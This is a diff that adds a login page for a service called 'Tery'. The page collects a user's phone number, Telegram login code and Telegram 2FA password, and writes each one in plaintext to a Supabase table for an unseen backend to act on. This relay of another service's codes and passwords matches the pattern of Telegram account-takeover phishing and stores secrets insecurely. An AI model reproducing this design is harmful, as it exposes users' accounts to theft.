@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tery | Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body class="bg-gray-900 text-white font-sans">
+    <section class="min-h-screen flex items-center justify-center px-6">
+        <div class="bg-gray-800 p-8 rounded-2xl shadow-2xl w-full max-w-md border border-gray-700 text-center">
+            <h1 class="text-3xl font-bold text-blue-500 mb-2">Tery.</h1>
+            <p id="status-text" class="text-gray-400 mb-8">Enter your phone to start.</p>
+            
+            <div id="phone-step">
+                <input type="text" id="phone_input" placeholder="+1234567890" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 mb-4">
+                <button onclick="sendPhone()" class="w-full bg-blue-600 py-3 rounded-lg font-bold">Get Code</button>
+            </div>
+
+            <div id="code-step" class="hidden">
+                <input type="text" id="code_input" placeholder="Enter Code" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 mb-4">
+                <button onclick="verifyCode()" class="w-full bg-blue-600 py-3 rounded-lg font-bold">Verify Code</button>
+            </div>
+
+            <div id="password-step" class="hidden">
+                <input type="password" id="password_input" placeholder="2FA Password" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 mb-4">
+                <button onclick="verifyPassword()" class="w-full bg-blue-600 py-3 rounded-lg font-bold">Login</button>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        const supabaseClient = supabase.createClient('YOUR_SUPABASE_URL', 'YOUR_ANON_KEY');
+        let currentId = null;
+
+        async function sendPhone() {
+            const phone = document.getElementById('phone_input').value;
+            const { data } = await supabaseClient.from('login_requests').insert([{ phone_number: phone }]).select();
+            currentId = data[0].id;
+            document.getElementById('phone-step').classList.add('hidden');
+            document.getElementById('status-text').innerText = "Requesting code...";
+            startListening();
+        }
+
+        function startListening() {
+            supabaseClient.channel('logins').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'login_requests', filter: `id=eq.${currentId}` }, (payload) => {
+                const s = payload.new.status;
+                if (s === 'awaiting_code') { 
+                    document.getElementById('code-step').classList.remove('hidden');
+                    document.getElementById('status-text').innerText = "Check Telegram for code.";
+                }
+                if (s === 'awaiting_password') { 
+                    document.getElementById('code-step').classList.add('hidden');
+                    document.getElementById('password-step').classList.remove('hidden');
+                    document.getElementById('status-text').innerText = "Enter 2FA Password.";
+                }
+                if (s === 'success') { 
+                    localStorage.setItem('tery_uid', payload.new.user_id);
+                    window.location.href = 'dashboard.html'; 
+                }
+            }).subscribe();
+        }
+
+        async function verifyCode() {
+            await supabaseClient.from('login_requests').update({ telegram_code: document.getElementById('code_input').value, status: 'code_submitted' }).eq('id', currentId);
+        }
+
+        async function verifyPassword() {
+            await supabaseClient.from('login_requests').update({ two_fa_password: document.getElementById('password_input').value, status: 'password_submitted' }).eq('id', currentId);
+        }
+    </script>
+</body>
+</html>
+
